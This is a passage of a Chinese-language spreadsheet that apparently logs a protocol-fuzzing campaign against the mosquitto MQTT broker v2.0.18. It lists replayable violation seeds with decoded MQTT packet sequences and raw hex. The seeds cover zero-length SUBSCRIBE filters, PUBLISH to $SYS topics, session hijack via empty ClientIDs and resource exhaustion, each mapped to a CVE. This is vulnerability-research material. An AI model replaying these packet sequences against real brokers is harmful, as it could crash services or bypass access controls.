        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 841B (报告+请求数据)\u000a请求数据: 175B\u000a\u000a---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MQTT请求序列(175B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4190 Topics=[''(零长度!QoS=3)] | raw_header=8211105e00000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=127B | raw_header=35960100152473686172652f6772702f\u000aMsg[3]: (不完整,3B) raw=018b8b\u000a(尾部3B): 018b8b</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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0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0">
      <c r="A210" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B210" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C210" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(116B)\u000a4.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10" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 928B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MQTT请求序列(116B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4428 Topics=[''(零长度!QoS=3)] | raw_header=821e114c00000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=58B | raw_header=3b4f0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=107fff\u000a(尾部3B): 107fff</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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1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11">
      <c r="A211" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B211" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C211" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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211" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 927B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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MQTT请求序列(194B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a21900044d7054540400003c000d7065\u000aMsg[2]: SUBSCRIBE PacketID=47 Topics=[''(零长度!QoS=2)] | raw_header=8241002f0000062b2f6461746125001d\u000aMsg[3]: PUBLISH Topic='$share/grp2/sensor/#' QoS=1 retain=False payload_len=60B | raw_header=325200142473686172652f677270322f\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=['\x00\x7fst/#'(QoS=1)] | raw_header=820b00010006007f73742f2301\u000aMsg[5]: PINGREQ  | raw_header=c000\u000aMsg[6]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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2">
      <c r="A212" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B212" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C212" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(242B)\u000a4.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12" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c4 ===\u000a大小: 999B (报告+请求数据)\u000a请求数据: 242B\u000a\u000a---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MQTT请求序列(242B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20a00024d5154540402003c\u000aMsg[2]: TYPE0  | raw_header=000766757a7a5f6334\u000aMsg[3]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d746573742f72657461696e65\u000aMsg[4]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=3)] | raw_header=82120002000003e873742f72824400c7\u000aMsg[5]: CONNACK session_present=104 reason_code=97 | raw_header=2473686172652f6772702f746573742f\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1e25313944141f365c0565c35f62ceb2\u000aMsg[7]: (不完整,21B) raw=34481cf7a77ec5657461696e65640050020003dfe5\u000a(尾部21B): 34481cf7a77ec5657461696e65640050020003dfe5</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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1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3">
      <c r="A213" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B213" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C213" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(105B)\u000a4.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13" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 606B (报告+请求数据)\u000a请求数据: 105B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(105B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=00340e0006743073740201fff8547461\u000aMsg[2]: PUBREL  | raw_header=6300\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x06¶§ýçÀyÕr~\x14\x016¿að\©\x89Ø\u000aÆzw©K' | raw_header=322f0013245359532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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1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14">
      <c r="A214" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B214" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C214" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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14" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 754B (报告+请求数据)\u000a请求数据: 67B\u000a\u000a---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MQTT请求序列(67B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2598 Topics=['a/b/c/d/e'(QoS=1)] | raw_header=820e0a260009612f622f632f642f6501\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload='\u000a'VÃ,îjá\x91¼ÎR¤Ý\x1bëXù\x8f\x13\x12\x12\u00adùs ' | raw_header=352f0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=71c8\u000a(尾部2B): 71c8</f>
        <v/>
      </c>
      <c r="F2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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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15">
      <c r="A215" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B215" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C215" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(931B)\u000a4.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15" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 1475B (报告+请求数据)\u000a请求数据: 931B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(931B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[2]: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TYPE0  | raw_header=0b534352414d2d5348412d3116000539\u000aMsg[13]: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(不完整,6B) raw=262626262626\u000a(尾部6B): 262626262626</f>
        <v/>
      </c>
      <c r="F2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1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15" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J21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15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16">
      <c r="A216" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B216" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C216" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(1150B)\u000a4.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16" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 1700B (报告+请求数据)\u000a请求数据: 1150B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(1150B原始二进制) ---\u000aMsg[1]: CONNECT Proto= QTÝ v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10130004205154dd0001000000000000\u000aMsg[2]: SUBSCRIBE PacketID=1752 Topics=[] | raw_header=825606d8565656565656565656565656\u000aMsg[3]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[4]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[5]: PUBREC  | raw_header=5600\u000aMsg[6]: PUBREC PacketID=22102 | raw_header=565656565656565656565656666c6e65\u000aMsg[7]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[8]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[9]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[10]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[11]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[12]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[13]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[14]: PUBREC PacketID=22102 | raw_header=56565656565656565656565656565656\u000aMsg[15]: (不完整,71B) raw=5656565656e803565656565656565656565656565656565656565656565656565656560b00000766\u000a(尾部71B): 5656565656e803565656565656565656565656565656565656565656565656565656560b00000766752303be0a0001de0674</f>
        <v/>
      </c>
      <c r="F2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1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16" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J21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1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17">
      <c r="A217" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B217" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C217" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(1084B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E217" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 2560B (报告+请求数据)\u000a请求数据: 1084B\u000a\u000a---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MQTT请求序列(1084B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a42d776974682d7370656388616c2140\u000aMsg[2]: CONNACK session_present=130 reason_code=11 | raw_header=2302820b\u000aMsg[3]: TYPE0  | raw_header=00190006746573742f2300a20e801a00\u000aMsg[4]: PUBLISH Topic='$SYS/broker/upt222' QoS=2 retain=False payload='222222222222222' | raw_header=34230012245359532f62726f6b65722f\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[6]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[7]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[8]: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raw_header=32323232323232323232323232323232\u000aMsg[19]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[20]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232322e32323232\u000aMsg[21]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[22]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[23]: (不完整,33B) raw=32323232323232323232323232696d65001b7b2274656d70223a32322e357de000\u000a(尾部33B): 32323232323232323232323232696d65001b7b2274656d70223a32322e357de000</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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1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18">
      <c r="A218" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B218" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C218" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(92B)\u000a4.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18" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 644B (报告+请求数据)\u000a请求数据: 92B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(92B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2217 Topics=[''(零长度!QoS=2), '$SYS/broker/version'(QoS=2), '$share/grp2/sensor/#'(QoS=2)] | raw_header=823208a90000020013245359532f6272\u000aMsg[2]: PUBLISH Topic='home/+/temperature' QoS=1 retain=False payload='\x08ªó\x9a\x03\x90L\x85^½3rÏ' | raw_header=32210012686f6d652f2b2f74656d7065\u000aMsg[3]: PINGRESP  | raw_header=d900\u000aMsg[4]: (不完整,3B) raw=006700\u000a(尾部3B): 006700</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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1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19">
      <c r="A219" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B219" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C219" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(62B)\u000a4.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19" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 760B (报告+请求数据)\u000a请求数据: 62B\u000a\u000a---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MQTT请求序列(62B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2452 Topics=[''(零长度!QoS=2)] | raw_header=82050994000002\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\u0009\x95\x00{«úÅ\x14\x04\x85kN\x1fâÁï¼|NãÀPc©]\x8db»¤' | raw_header=3a320013245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=30127f\u000a(尾部3B): 30127f</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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1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20">
      <c r="A220" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B220" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C220" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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20" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 829B (报告+请求数据)\u000a请求数据: 90B\u000a\u000a---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MQTT请求序列(90B原始二进制) ---\u000aMsg[1]: DISCONNECT 断开连接 | raw_header=e90164\u000aMsg[2]: SUBSCRIBE PacketID=1686 Topics=[''(零长度!QoS=2)] | raw_header=82050696000002\u000aMsg[3]: PUBLISH Topic='$share/grp2/sensor/#' QoS=0 retain=True payload_len=55B | raw_header=314d00142473686172652f677270322f\u000aMsg[4]: PUBCOMP  | raw_header=7e</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J22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2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21">
      <c r="A221" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B221" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C221" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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21" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 986B (报告+请求数据)\u000a请求数据: 100B\u000a\u000a---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MQTT请求序列(100B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1323 Topics=[''(零长度!QoS=1), 'a/b/c/d/e'(QoS=0)] | raw_header=8211052b0000010009612f622f632f64\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=46B | raw_header=39430013245359532f62726f6b65722f\u000aMsg[3]: UNSUBSCRIBE  | raw_header=a20af10002640e0006615161</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J22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2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22">
      <c r="A222" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B222" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C222" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(296B)\u000a4.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22" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 1010B (报告+请求数据)\u000a请求数据: 296B\u000a\u000a---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MQTT请求序列(296B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=4 | raw_header=621300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=2)] | raw_header=820b00010006746573742f2302\u000aMsg[3]: SUBSCRIBE PacketID=442 Topics=['$share/grp1/#'(QoS=0), ''(零长度!QoS=0)] | raw_header=822701ba000d2473686172652f677270\u000aMsg[4]: PUBREL PacketID=14663 | raw_header=65023947\u000aMsg[5]: TYPE0  | raw_header=00152473686172652f6772702f746573\u000aMsg[6]: (不完整,194B) raw=8ee0eaeff35c3fa5c0ef34a0d92396ef9a4ee3a6d476eac451b14f340e0006746573742f63000364\u000a(尾部194B): 8ee0eaeff35c3fa5c0ef34a0d92396ef9a4ee3a6d476eac451b14f340e0006746573742f630003646174610004621300044d</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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2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23">
      <c r="A223" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B223" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C223" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(67B)\u000a4.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23" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 967B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SUBSCRIBE PacketID=59 Topics=[''(零长度!QoS=3)] | raw_header=8231003b000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='t' QoS=2 retain=True payload='\x00&lt;\x03\x03\x00\x00Ga\x80' | raw_header=350c000174003c03030000476180\u000aMsg[3]: TYPE0  | raw_header=0000</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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2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24">
      <c r="A224" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B224" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C224" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(28B)\u000a4.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24" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 430B (报告+请求数据)\u000a请求数据: 28B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(28B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(9299B) clean_session=True keepalive=18s Will=YES [自动清理会话] | raw_header=101300044d515454047e001224535953\u000aMsg[2]: (不完整,7B) raw=6572b099820618\u000a(尾部7B): 6572b099820618</f>
        <v/>
      </c>
      <c r="F2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2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24" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J22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2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25">
      <c r="A225" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B225" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C225" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(3419B)\u000a4.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225" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 3934B (报告+请求数据)\u000a请求数据: 3419B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(3419B原始二进制) ---\u000aMsg[1]: (不完整,3419B) raw=8491ffffff01000000e3637676767676767676767676767676767676767676767676767676767676\u000a(尾部3419B): 8491ffffff01000000e363767676767676767676767676767676767676767676767676767676767676767685767676767676</f>
        <v/>
      </c>
      <c r="F2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22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225" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J22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22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226">
      <c r="A226" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B226" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C226" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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26" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 805B (报告+请求数据)\u000a请求数据: 235B\u000a\u000a---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MQTT请求序列(235B原始二进制) ---\u000aMsg[1]: (不完整,235B) raw=3d93ef0b0080f4f400daf4f4f4000003e8d5f4f4f4f4f4f4f4f440f4f4f4f4f4f4f4f4f4f4f4f410\u000a(尾部235B): 3d93ef0b0080f4f400daf4f4f4000003e8d5f4f4f4f4f4f4f4f440f4f4f4f4f4f4f4f4f4f4f4f410000000f4f4f4f6f3f482</f>
        <v/>
      </c>
      <c r="F2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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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27">
      <c r="A227" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B227" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C227" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(12351B)\u000a4.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27" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 4468B (报告+请求数据)\u000a请求数据: 12351B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(12351B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=2b9b0026262626262626262626262626\u000aMsg[2]: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DISCONNECT 断开连接 | raw_header=e6262626262626262626262626262626\u000aMsg[8]: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PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36262626262626262626262626262626\u000aMsg[13]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[14]: CONNACK session_present=38 reason_code=38 | raw_header=267f2626262626262626262626262626\u000aMsg[15]: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raw_header=26262626262626262626262626262626\u000a(尾部3055B): 26262626262626262626262626262626262626262626262626262626262626c0002626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F2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2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27" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J22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2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28">
      <c r="A228" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B228" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C228" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
